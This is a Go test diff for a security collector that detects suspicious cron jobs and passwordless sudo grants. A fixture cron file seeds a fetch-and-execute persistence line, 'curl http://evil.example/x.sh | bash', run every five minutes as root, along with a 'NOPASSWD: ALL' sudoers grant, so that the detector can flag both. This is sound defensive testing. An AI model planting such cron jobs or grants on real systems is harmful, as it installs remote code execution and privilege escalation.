@@ -5,6 +5,7 @@ package collectors
 import (
 	"fmt"
 	"os"
+	"strings"
 	"testing"
 	"time"
 
@@ -156,5 +157,48 @@ func TestParseAVCGroups(t *testing.T) {
 	}
 	if groups[0].Tclass != "file" || groups[0].Count != 1 {
 		t.Errorf("the enforced httpd/shadow denial should be the sole group, got %+v", groups[0])
+	}
+}
+
+// TestParseSuspectCrons guards the cron-persistence detection: a job piping to
+// a shell or writing into a system/world-writable path must be flagged, a
+// benign job must not, and comment/blank lines must be skipped.
+func TestParseSuspectCrons(t *testing.T) {
+	withFixtureSource(t, func(b *source.Bundle) {
+		b.PutDir("/etc/cron.d", []string{"backdoor", "legit"})
+		b.PutFile("/etc/cron.d/backdoor", []byte(
+			"# comment, ignored\n"+
+				"\n"+ // blank line, ignored
+				"*/5 * * * * root curl http://evil.example/x.sh | bash\n",
+		))
+		b.PutFile("/etc/cron.d/legit", []byte("0 3 * * * root /usr/local/bin/backup.sh\n"))
+		// Other cron dirs simply aren't seeded — must be skipped, not error out.
+	})
+	info := &models.SecurityInfo{}
+	parseSuspectCrons(info)
+
+	if len(info.SuspectCrons) != 1 {
+		t.Fatalf("expected exactly 1 suspect entry (the pipe-to-bash job), got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
+	}
+	if !strings.Contains(info.SuspectCrons[0], "backdoor") {
+		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
+	}
+}
+
+// TestParseSudoers guards the sudo NOPASSWD audit: a specific-command NOPASSWD
+// for "ALL" users is benign noise (skipped), but a full "NOPASSWD: ALL" grant
+// for a real user must be reported.
+func TestParseSudoers(t *testing.T) {
+	withFixtureSource(t, func(b *source.Bundle) {
+		b.PutFile("/etc/sudoers", []byte("root ALL=(ALL:ALL) ALL\n"))
+		b.PutGlob("/etc/sudoers.d/*", []string{"/etc/sudoers.d/90-deploy", "/etc/sudoers.d/91-benign"})
+		b.PutFile("/etc/sudoers.d/90-deploy", []byte("deploy ALL=(ALL) NOPASSWD: ALL\n"))
+		b.PutFile("/etc/sudoers.d/91-benign", []byte("ALL ALL=(root) NOPASSWD: /usr/sbin/mintdrivers\n"))
+	})
+	info := &models.SecurityInfo{}
+	parseSudoers(info)
+
+	if len(info.SudoNopasswd) != 1 || info.SudoNopasswd[0] != "deploy" {
+		t.Errorf("only the full-escalation deploy grant should be reported (the ALL-users specific-command grant is benign noise), got %v", info.SudoNopasswd)
 	}
 }
